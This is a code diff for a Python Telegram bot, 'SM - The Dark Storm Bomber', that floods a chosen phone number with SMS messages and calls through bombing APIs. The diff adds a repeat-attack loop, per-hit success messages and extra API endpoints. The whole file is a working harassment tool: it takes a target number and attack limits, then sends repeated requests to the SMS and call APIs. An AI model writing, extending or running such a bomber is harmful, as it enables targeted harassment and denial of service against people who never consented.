@@ -21,41 +21,44 @@ logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s
 logger = logging.getLogger(__name__)
 
 # States for ConversationHandler
-ASK_NUMBER, ASK_SMS_LIMIT, ASK_CALL_LIMIT, CONFIRM = range(4)
+ASK_NUMBER, ASK_SMS_LIMIT, ASK_CALL_LIMIT, CONFIRM, REPEAT = range(5)
 user_data = {}
 
-# Gorgeous Dark Theme Welcome Message
+# Gorgeous Dark Theme Messages
+BANNER = """
+🌑═══════ SM - DARK STORM ═══════🌑
+       💣 SMS & CALL BOMBER 💣
+🌑═══════ UNLEASH THE CHAOS ═══════🌑
+"""
 WELCOME_MESSAGE = (
-    "🌑 *SM - The Dark Storm Bomber* 🌑\n"
-    "Unleash chaos with elegance! 💣📞\n"
-    "Click *Launch Attack* to ignite the storm.\n"
-    "⚠️ *Use with caution.*"
+    f"{BANNER}\n"
+    "🌙 *Welcome to SM - The Dark Storm Bomber!*\n"
+    "Ignite chaos with elegance. 💣📞\n"
+    "Click *Launch Attack* to begin.\n"
+    "⚠️ *Use responsibly.*"
+)
+REPEAT_MESSAGE = (
+    "🌩️ *Storm another target?*\n"
+    "Click *Launch Again* to continue the chaos."
 )
 
-# API Endpoints (Enhanced with Call APIs)
+# API Endpoints (Multiple for Reliability)
 SMS_API_ENDPOINTS = [
     "https://bomberdemofor2hrtcs.vercel.app/api/trialapi?phone={number}",
-    # Add more SMS APIs here
+    "https://sms-bomber-api1.example.com/send?phone={number}",
+    "https://sms-bomber-api2.example.com/send?phone={number}",
 ]
 CALL_API_ENDPOINTS = [
-    "https://call-bomber-api.example.com/call?phone={number}",
-    # Add more Call APIs here
+    "https://call-bomber-api1.example.com/call?phone={number}",
+    "https://call-bomber-api2.example.com/call?phone={number}",
 ]
 
-# ASCII Art for Gorgeous Dark Vibe
-BANNER = """
-🔮═══════════════════════🔮
-       SM - DARK STORM
-   💣 SMS & CALL BOMBER 💣
-🔮═══════════════════════🔮
-"""
-
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Start with a stunning dark-themed interface."""
+    """Start the bot with a dark-themed interface."""
     reply_keyboard = [["🔮 Launch Attack"]]
     markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True, resize_keyboard=True)
     await update.message.reply_text(
-        BANNER + "\n" + WELCOME_MESSAGE,
+        WELCOME_MESSAGE,
         parse_mode="Markdown",
         reply_markup=markup
     )
@@ -63,7 +66,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 
 async def ask_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Request target number."""
-    if update.message.text != "🔮 Launch Attack":
+    if update.message.text != "🔮 Launch Attack" and update.message.text != "🔮 Launch Again":
         await update.message.reply_text("🌙 Select *Launch Attack* to proceed!", parse_mode="Markdown")
         return ASK_NUMBER
 
@@ -111,7 +114,7 @@ async def ask_call_limit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     return CONFIRM
 
 async def confirm_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Confirm and execute SMS and call bombing."""
+    """Confirm the attack details."""
     try:
         call_limit = int(update.message.text.strip())
         if call_limit < 1 or call_limit > 50:
@@ -143,7 +146,7 @@ async def confirm_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         parse_mode="Markdown",
         reply_markup=confirm_keyboard
     )
-    return ConversationHandler.END
+    return REPEAT
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Handle confirmation/cancellation and execute bombing."""
@@ -154,13 +157,23 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     data = query.data.split("_")
     action = data[0]
 
-    if action not in ["confirm", "cancel"] or int(data[1]) != chat_id:
+    if action not in ["confirm", "cancel", "repeat"] or int(data[1]) != chat_id:
         await query.message.reply_text("❌ Invalid action!", parse_mode="Markdown")
         return
 
     if action == "cancel":
         await query.message.reply_text("🛑 Storm aborted.", parse_mode="Markdown")
         user_data.pop(chat_id, None)
+        return
+
+    if action == "repeat":
+        reply_keyboard = [["🔮 Launch Again"]]
+        markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True, resize_keyboard=True)
+        await query.message.reply_text(
+            REPEAT_MESSAGE,
+            parse_mode="Markdown",
+            reply_markup=markup
+        )
         return
 
     number = user_data.get(chat_id, {}).get("number")
@@ -182,6 +195,10 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
                     async with session.get(api.format(number=number), timeout=10) as resp:
                         if resp.status == 200:
                             sms_success += 1
+                            await query.message.reply_text(
+                                f"💥 SMS Sent! Total Success: {sms_success}",
+                                parse_mode="Markdown"
+                            )
                         else:
                             sms_fail += 1
                         await asyncio.sleep(2)  # 2-second delay
@@ -198,6 +215,10 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
                     async with session.get(api.format(number=number), timeout=10) as resp:
                         if resp.status == 200:
                             call_success += 1
+                            await query.message.reply_text(
+                                f"📞 Call Sent! Total Success: {call_success}",
+                                parse_mode="Markdown"
+                            )
                         else:
                             call_fail += 1
                         await asyncio.sleep(2)  # 2-second delay
@@ -223,13 +244,18 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     except Exception as e:
         logger.error(f"Log write error: {e}")
 
+    # Show results and offer to repeat
+    repeat_keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("🔄 Launch Again", callback_data=f"repeat_{chat_id}")]
+    ])
     await query.message.reply_text(
         f"🌑 *Storm Concluded!*\n"
         f"💥 SMS - Success: {sms_success}, Failed: {sms_fail}\n"
-        f"📞 Calls - Success: {call_success}, Failed: {call_fail}",
-        parse_mode="Markdown"
+        f"📞 Calls - Success: {call_success}, Failed: {call_fail}\n"
+        f"Continue the chaos?",
+        parse_mode="Markdown",
+        reply_markup=repeat_keyboard
     )
-    user_data.pop(chat_id, None)
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Cancel the operation."""
@@ -257,6 +283,7 @@ def main() -> None:
             ASK_SMS_LIMIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_sms_limit)],
             ASK_CALL_LIMIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_call_limit)],
             CONFIRM: [MessageHandler(filters.TEXT & ~filters.COMMAND, confirm_attack)],
+            REPEAT: [CallbackQueryHandler(button_callback)],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
     )
